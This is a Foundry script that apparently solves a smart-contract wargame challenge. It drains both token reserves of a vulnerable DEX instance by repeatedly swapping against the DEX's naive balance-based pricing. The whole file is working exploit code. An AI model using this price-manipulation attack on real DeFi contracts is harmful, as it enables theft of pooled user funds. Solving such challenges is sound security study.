// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract SolvingScript is Script {
    address victim = ; // Your instance address
    IDex dex = IDex(victim);
    address token1 = dex.token1();
    address token2 = dex.token2();

    function run() public {
        vm.startBroadcast();

        dex.approve(victim, type(uint256).max);

        vm.stopBroadcast();

        drainTokens();
    }

    function drainTokens() internal {
        uint256 dexToken1 = dex.balanceOf(token1, victim);
        uint256 dexToken2 = dex.balanceOf(token2, victim);

        while (dexToken1 > 0 || dexToken2 > 0) {
            vm.startBroadcast();
            uint256 myToken1 = dex.balanceOf(token1, msg.sender);
            uint256 myToken2 = dex.balanceOf(token2, msg.sender);
            dexToken1 = dex.balanceOf(token1, victim);
            dexToken2 = dex.balanceOf(token2, victim);
            uint256 maxSwap1 = dex.getSwapPrice(token1, token2, dexToken1);
            uint256 maxSwap2 = dex.getSwapPrice(token2, token1, dexToken2);

            if (maxSwap1 > myToken1 && maxSwap2 > myToken1 && maxSwap1 > myToken2 && maxSwap2 > myToken2) {
                if (myToken1 == 0) {
                    dex.swap(token2, token1, myToken2);
                } else {
                    dex.swap(token1, token2, myToken1);
                }
            } else {
                if (myToken1 == 0) {
                    dex.swap(token2, token1, maxSwap1);
                    break;
                } else {
                    dex.swap(token1, token2, maxSwap2);
                    break;
                }
            }
            vm.stopBroadcast();
        }
        uint256 myToken1 = dex.balanceOf(token1, msg.sender);
        uint256 myToken2 = dex.balanceOf(token2, msg.sender);
        dexToken1 = dex.balanceOf(token1, victim);
        dexToken2 = dex.balanceOf(token2, victim);
        console2.log(myToken1, myToken2, dexToken1, dexToken2);
    }
}
